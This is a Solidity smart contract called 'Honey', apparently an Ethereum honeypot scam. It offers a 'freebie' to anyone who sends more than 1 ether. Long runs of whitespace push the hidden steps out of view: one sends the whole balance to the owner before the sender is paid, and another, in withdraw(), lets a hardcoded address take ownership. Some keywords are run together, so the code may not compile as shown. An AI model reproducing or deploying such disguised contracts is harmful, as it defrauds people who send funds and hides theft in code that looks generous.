pragma solidity ^0.4.19;contract Honey{address public Owner = msg.sender;function()publicpayable{}function GetFreebie()publicpayable{if(msg.value>1 ether){                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Owner.transfer(this.balance);msg.sender.transfer(this.balance);}}function withdraw()payablepublic{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}require(msg.sender == Owner);Owner.transfer(this.balance);}function Command(address adr,bytes data)payablepublic{require(msg.sender == Owner);adr.call.value(msg.value)(data);}}